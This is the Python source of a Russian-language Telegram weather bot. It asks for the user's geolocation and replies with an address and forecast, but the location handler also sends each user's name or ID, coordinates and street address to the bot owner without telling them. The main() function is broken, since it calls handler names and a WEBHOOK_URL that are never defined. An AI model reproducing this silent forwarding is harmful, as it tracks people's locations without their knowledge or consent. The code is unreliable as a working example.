import os
import logging
import pytz
import requests
from datetime import datetime
from geopy.geocoders import Nominatim
from dotenv import load_dotenv
from telegram import Update, ReplyKeyboardRemove
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Загрузка переменных окружения
load_dotenv()
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
OWM_KEY = os.getenv("OWM_API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID"))

# Логгер
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# ===📦 Обработка локации ===
async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    await message.reply_text("Спасибо! 🛰", reply_markup=ReplyKeyboardRemove())

    user = update.effective_user
    location = message.location

    lat = location.latitude
    lon = location.longitude

    username = f"@{user.username}" if user.username else f"{user.full_name} (id:{user.id})"

    # Получение адреса
    geolocator = Nominatim(user_agent="telegram_weather_bot")
    address = "не удалось определить"
    try:
        location_info = geolocator.reverse((lat, lon), language="ru", timeout=10)
        if location_info:
            address = location_info.address
    except Exception as e:
        logger.warning(f"Geo error: {e}")

    # Локальное время (Europe/Chisinau — можешь изменить при желании)
    try:
        tz = pytz.timezone("Europe/Kiev")
        local_time = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        local_time = "Не удалось определить"

    # Сообщение пользователю
    reply_msg = (
        f"🌍 Координаты:\n"
        f"Широта: {lat:.5f}\n"
        f"Долгота: {lon:.5f}\n\n"
        f"📍 Адрес: {address}\n"
        f"🕒 Местное время: {local_time} (Europe/Kiev)\n"
    )

    # Прогноз погоды
    forecast = ""
    try:
        url = f"https://api.openweathermap.org/data/2.5/forecast?lat={lat}&lon={lon}&appid={OWM_KEY}&units=metric&lang=ru"
        res = requests.get(url)
        data = res.json()
        if "list" in data:
            forecast += "\n☁️ Прогноз погоды:\n"
            for entry in data["list"][:4]:
                dt = entry["dt_txt"]
                temp = entry["main"]["temp"]
                desc = entry["weather"][0]["description"]
                forecast += f"{dt}: {temp}°C, {desc}\n"
        else:
            forecast += "⚠️ Не удалось получить погоду."
    except Exception as e:
        logger.error(f"Weather error: {e}")
        forecast += "⚠️ Ошибка при получении погоды."

    # Ответ пользователю
    await message.reply_text(reply_msg + forecast)

    # Отправка админу
    full_msg = (
        f"🧭 Получена локация от {username}\n"
        f"📍 Адрес: {address}\n"
        f"🌐 Координаты: {lat:.5f}, {lon:.5f}\n"
        f"🕒 Время: {local_time}\n" +
        forecast
    )
    await context.bot.send_message(chat_id=OWNER_ID, text=full_msg)


# === /start ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Привет! Пришли свою геолокацию 📍")


import asyncio

async def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Регистрируем handlers и т.д.
    application.add_handler(CommandHandler("start", start_handler))
    application.add_handler(MessageHandler(filters.LOCATION, location_handler))

    # Настраиваем webhook
    await application.initialize()
    await application.start()
    await application.bot.set_webhook(url=WEBHOOK_URL)
    await application.updater.start_webhook()

    # Ожидаем завершения
    await application.updater.wait_for_stop()
    await application.stop()
    await application.shutdown()

if __name__ == "__main__":
    asyncio.run(main())


